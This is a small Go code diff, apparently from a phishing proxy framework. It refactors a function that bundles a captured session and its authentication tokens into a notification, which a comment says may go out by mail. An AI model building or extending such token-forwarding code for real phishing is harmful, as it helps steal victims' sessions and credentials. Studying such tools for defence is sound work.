@@ -145,10 +145,9 @@ func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
 // prepares the Body for authorized requests and triggers NotifierSend
 func NotifyOnAuth(n *Notify, session database.Session, phishlet *Phishlet) error {
 	s := session
-	p := *phishlet
 	b := Visitor{
 		Session: s,
-		Tokens:  tokensToJSON(&p, s.Tokens),
+		Tokens:  tokensToJSON(s.Tokens),
 	}
 	//TODO option to not send sensitive data by mail
 
